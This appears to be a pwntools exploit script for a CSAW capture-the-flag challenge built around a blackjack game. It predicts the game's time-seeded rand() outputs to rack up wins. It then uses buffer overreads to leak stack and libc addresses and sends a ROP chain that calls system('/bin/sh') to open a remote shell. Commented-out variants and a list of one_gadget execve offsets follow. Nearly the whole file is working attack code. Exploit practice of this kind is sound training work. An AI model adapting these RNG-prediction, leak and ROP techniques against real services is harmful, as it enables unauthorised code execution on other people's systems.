#!/usr/bin/python

from pwn import *
import sys
import ctypes
import time

remote_ip, port = 'when-to-h1t.chal.csaw.io', 5032
binary = './chal_patched'
brkpts = '''
b*$rebase(0x21e5)
b*$rebase(0x23d2)
c
'''

elf = ELF("chal_patched")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)
    
def predict_card(dealer = False):
    global turn
    turn = 0
    if dealer:
        turn = 1
    card = clibc.rand() % 13 + 1
    if card < 10:
        return card
    elif card in [10, 12, 13]:
        return 10
    elif scores[0] > 10:
        return 1
    return 11

def decision():
    global scores, prev
    val = predict_card()
    if scores[0] + val == 21:
        scores[0] = 21
        return "w"
    elif (scores[0] + val) < 21:
        scores[0] += val
        return "h"
    else:
        prev = val
        return "s"

def first_turn():
    global scores
    scores[0] += predict_card()
    scores[1] += predict_card(True)

def stay():
    global wins, scores, prev, losses
    if prev != 0:
        scores[1] += prev
        prev = 0
    else:
        scores[1] += predict_card(True)
    if scores[1] <= 16:
        stay()
    elif scores[1] > 21:
        wins += 1
        return
    elif scores[1] > scores[0]:
        losses += 1
        return
    else:
        wins += 1
        return

def hit():
    global wins, scores, losses
    scores[1] += predict_card(True)
    if scores[1] > 21:
        wins += 1
        return
    elif scores[1] == 21:
        losses += 1
        return
    else:
        play_turn()

def play_turn():
    global wins, move_count
    outcome = decision()
    if outcome == "w":
        sla("stay.", "h")
    else:
        sla("stay.", outcome)
    log.info("Current scores after {}: {}".format(outcome, scores))
    if outcome == "w":
        wins += 1
    elif outcome == "s":
        stay()
    elif outcome == "h":
        hit()

def calc_offset(stack_leak):
    rbp = stack_leak + 0xf88
    target = rbp & 0xff
    addr = stack_leak - 0x180
    offset = 0
    while (addr + offset) & 0xff != target:
        offset += 8
    offset += 8
    return offset + 5

scores = [0, 0]
turn = 0
wins = 0
losses = 0
prev = 0
move_count = 0

if __name__ == "__main__":
    
    # reu("[Note]")
    seed = int(time.time()) #+ 2
    clibc = ctypes.cdll.LoadLibrary("./libc.so.6")
    clibc.srand(seed)
    
    
    for i in range(2):
        
        sa("(Y/N)\n", "Y")
        wins = 0
        losses = 0
        move_count = 0
        
        while wins < 37 and wins + losses < 50:
            scores = [0, 0]
            turn = 0
            sla("Choice:", "1")
            first_turn()
            log.info("Current scores: {}".format(scores))
            play_turn()
        
        if wins == 37:
            if wins + losses < 50:
                sla("Choice:", "3")
                
            if i == 0:
                sa("name?\n", "a"*0x28)
                reu("a"*0x28)
                stack_leak = uu64(re(6))
                log.info("leak @ "+hex(stack_leak))
                
                sa("strategy?\n", "a"*0x31)
                
                # if i == 1:
                reu("Strategy==========")
                reu("a"*0x31)
                libc.address = uu64("\x00" + re(5)) - 0x1f2000
                log.info("libc @ "+hex(libc.address))
                pop_rdi = libc.address + 0x23b6a
                binsh = next(libc.search("/bin/sh"))
                system = libc.symbols['system']

            ropchain = flat([
                pop_rdi, binsh,
                pop_rdi+1, system
            ])
            
            if i == 1:
                sa("name?\n", "aaaa")
                offset = calc_offset(stack_leak)
                payload = "a"*0x333 + "\x00"*offset + ropchain
                log.info("offset @ "+hex(stack_leak - 0x185 + offset))
                # log.info("stack leak @ "+hex(stack_leak))
                log.info("rbp @ "+hex(stack_leak + 0xf80))
                sa("strategy?\n", payload)
            
            # elif i == 1:
            #     sa("name?\n", "aaaa")
                
            #     payload = ("a"*0x31a + p64(system)[:6]).ljust(0x332, "a")
            #     sa("strategy?\n", payload)
            
            # elif i == 2:
            #     gadgets = [0xe3afe, 0xe3b01, 0xe3b04, 0xe3cf3, 0xe3cf6]
            #     gadget = libc.address + gadgets[2]
            #     sa("name?\n", "aaaa")
            #     rbp = stack_leak + 0xf50
            #     start_addr = rbp - 0x332
            #     target = (rbp & 0xffffffffff00) + 8
            #     log.info("rbp @ "+hex(rbp))
            #     log.info("start @ "+hex(start_addr))
            #     log.info("target @ "+hex(target))
            #     payload = "a"*(target - start_addr) + p64(system)[:6]
            #     sla("strategy?\n", payload)
                
    sa("(Y/N)\n", "N")
    
    # sl("cat flag")
    
    # print(io.recv())
    
    io.interactive()

'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xe3cf3 execve("/bin/sh", r10, r12)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe3cf6 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
'''
    